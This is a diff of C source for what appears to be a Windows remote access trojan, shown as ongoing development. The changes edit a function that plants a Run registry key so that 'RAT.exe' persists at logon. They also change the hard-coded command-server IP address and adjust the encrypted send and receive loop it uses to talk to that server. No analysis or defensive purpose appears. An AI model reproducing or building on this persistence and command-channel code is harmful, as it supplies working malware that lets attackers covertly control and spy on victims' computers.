@@ -165,8 +165,8 @@ void PERSIST()
 {
     HKEY hKey;
     LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-    LPCSTR valueName = "MGMTSV";
-    LPCSTR newValue = "C:\\Windows\\MGMTSV.exe";
+    LPCSTR valueName = "RAT";
+    LPCSTR newValue = "C:\\Windows\\RAT.exe";
 
     RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
     RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)newValue, strlen(newValue) + 1);
@@ -192,12 +192,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
     //SOCKET CONNECTOR
     WSADATA wsaData;
 
-    char serverIP[] = "138.75.195.115";
+    char serverIP[] = "10.77.252.111";
     int serverPort = SVPORT;
 
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    printf("dasd");
+    
     struct sockaddr_in serverInfo;
     serverInfo.sin_family = AF_INET;
     serverInfo.sin_addr.s_addr = inet_addr(serverIP);
@@ -232,10 +232,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
         unsigned char* recvAESText = malloc(aesCiphertextLen + EVP_MAX_IV_LENGTH);
         int recvAESTextLen = aesCiphertextLen + EVP_MAX_IV_LENGTH;
         recv(sockfd, (char*)recvAESText, recvAESTextLen, 0);
-        //m
-        unsigned char iv[EVP_MAX_IV_LENGTH];
 
-        //unsigned char aesCiphertext[aesCiphertextLen];
+        unsigned char iv[EVP_MAX_IV_LENGTH];
         unsigned char* aesCiphertext = malloc(aesCiphertextLen);
         memcpy(aesCiphertext, recvAESText, aesCiphertextLen);
         memcpy(iv, recvAESText + aesCiphertextLen, EVP_MAX_IV_LENGTH);
@@ -272,7 +270,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
             sendAESLen[10 - 1] = '\0';
             sprintf(sendAESLen, "%d", sendCiphertextLen);
             send(sockfd, sendAESLen, sizeof(sendAESLen), 0);
-
+            Sleep(100);
             sendall(sockfd, sendCiphertext, sendCiphertextLen);
 
             free(aesPlaintext);
